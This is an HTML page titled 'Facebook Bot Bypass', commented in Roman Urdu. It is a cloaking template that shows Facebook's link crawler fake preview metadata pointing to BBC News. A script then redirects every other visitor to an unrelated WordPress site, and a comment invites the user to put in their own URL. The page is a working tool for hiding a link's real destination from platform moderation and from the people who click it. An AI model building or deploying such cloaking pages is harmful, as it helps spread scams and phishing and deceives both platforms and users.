<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Bot Bypass</title>

    <!-- Facebook Bot ke liye Default OG Data -->
    <meta property="og:title" content="Check This Out!">
    <meta property="og:description" content="This is an amazing post!">
    <meta property="og:image" content="https://scontent.fkhi11-2.fna.fbcdn.net/v/t39.30808-6/481466622_996978739200788_5946416071541020219_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=833d8c&_nc_ohc=AckQCB_44QUQ7kNvgEp0hSf&_nc_oc=AdgINd8puYQCXTqDZKbcWrVBFINC4BKZGu_6s-BLWWsPm19nrvwrjFKAv0DgnzeC_Hs&_nc_zt=23&_nc_ht=scontent.fkhi11-2.fna&_nc_gid=AXmnviJCE-l5J5bn0Whqrc6&oh=00_AYDNVXuqb4MSafbanc3hWMHlOyTuycCTRoFCpxWA3sgGMw&oe=67C7D9B6">
    <meta property="og:url" content="https://www.bbc.com/news">

    <!-- JavaScript -->
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            let userAgent = navigator.userAgent || navigator.vendor || window.opera;
            let fbBots = ["facebookexternalhit", "Facebot"];

            // Check karein agar Facebook ka bot hai
            let isFacebookBot = fbBots.some(bot => userAgent.includes(bot));

            if (!isFacebookBot) {
                // Agar real user hai toh actual image aur redirect karein
                document.querySelector("meta[property='og:image']").setAttribute("content", "https://urltiger.com/content/images/YMxaui_475905001_933625322249112_7153849630038643873_n-(1).jpg");
                window.location.href = "https://wordpress-1379228-5231688.cloudwaysapps.com/wrgw/"; // Yahan apni original site ka URL dalain
            }
        });
    </script>
</head>
<body>
    <h1>Welcome to My Page</h1>
    <p>Real users will be redirected, while Facebook bots see a cached version.</p>
    <img src="https://urltiger.com/content/images/YMxaui_475905001_933625322249112_7153849630038643873_n-(1).jpg" alt="Real Image">
</body>
</html>
